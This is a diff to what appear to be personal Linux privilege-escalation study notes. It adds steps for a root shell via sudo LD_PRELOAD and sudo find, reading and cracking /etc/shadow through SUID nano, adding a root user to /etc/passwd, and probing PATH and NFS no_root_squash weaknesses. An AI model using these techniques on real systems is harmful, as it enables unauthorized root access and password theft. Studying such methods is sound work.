@@ -102,7 +102,9 @@ Use this shared object file when launching any program the user can run with sud
 
 3. Run the program with sudo rights and the `LD_PRELOAD` option pointing to the `.so` file
 
-    sudo LD_PRELOAD=/home/user/ldpreload/shell.so find
+```text
+sudo LD_PRELOAD=/home/user/ldpreload/shell.so find
+```
 
 This will result in a shell spawn with root privileges.
 
@@ -129,14 +131,38 @@ $ sudo find . -exec /bin/sh \; -quit
 uid=0(root) gid=0(root) groups=0(root)
 ```
 
-### SUID exploits
+### SUID exploit nano
 
-To list files that have `SUID` or `SGID` bits set:
+#### Crack passwords
+
+1. List files that have `SUID` or `SGID` bits set:
 
 ```text
 find / -type f -perm -04000 -ls 2>/dev/null
 ```
 
+2. Compare these executables with [GTFOBins SUID](https://gtfobins.github.io/#+suid). The nano text editor has the 
+SUID bit set
+3. Read `/etc/passwd` and `/etc/shadow` using nano.
+4. Copy contant to local `passwd.txt` resp `shadow.txt` files.
+5. Use the `unshadow` tool to create a file crackable by John the Ripper
+
+```text
+unshadow passwd.txt shadow.txt > passwords.txt
+```
+
+#### Add a user
+
+The other option would be to add a new user that has root privileges.
+
+1. Using the `openssl` tool, create a password hash for a new user:
+
+```text
+openssl passwd -1 -salt <password>
+```
+
+2. Add this password with a username to the `/etc/passwd` file. Use `root:/bin/bash` to give this user a root shell.
+3. Switch to this user.
 
 ### Capabilities exploit vim
 
@@ -247,7 +273,30 @@ Session completed.
 
 ### Path exploits
 
-### NFS exploits
+1. What folders are located under `$PATH`?
+
+````text
+$ echo $PATH
+````
+2. Does current user have `write` privileges for any of these folders?
+
+```text
+find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort
+```
+
+3. Can `$PATH` be modified?
+4. Is there a script/application that will be affected by this vulnerability?
+
+### NFS exploit /etc/exports
+
+1. Get information:
+
+```text
+$ ps aux | grep nfsd
+$ cat /etc/exports
+```
+
+2. Shares with the `no_root_squash` option can possibly be modified and executed as root.
 
 ## Notes
 
@@ -289,13 +338,12 @@ when the SUID bit is set see [GTFObins SUID](https://gtfobins.github.io/#+suid).
 
 ### Capabilities exploits
 
-### Cron jobs exploits
+Another method system administrators can use to increase the privilege level of a process or binary is by capabilities. 
+Capabilities help manage privileges at a more granular level. If a SOC analyst needs to use a tool that needs to 
+initiate socket connections, the capabilities of the binary can be changed such that it would get through its task 
+without needing a higher privilege user.
 
-### Path exploits
-
-### NFS exploits
-
-## Tools exploits
+## Tools
 
 * [LinEnum](https://github.com/rebootuser/LinEnum)
 * [PEASS-ng](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) is a script that searches for possible paths to escalate privileges on Linux/Unix* hosts. It also enumerates the system.
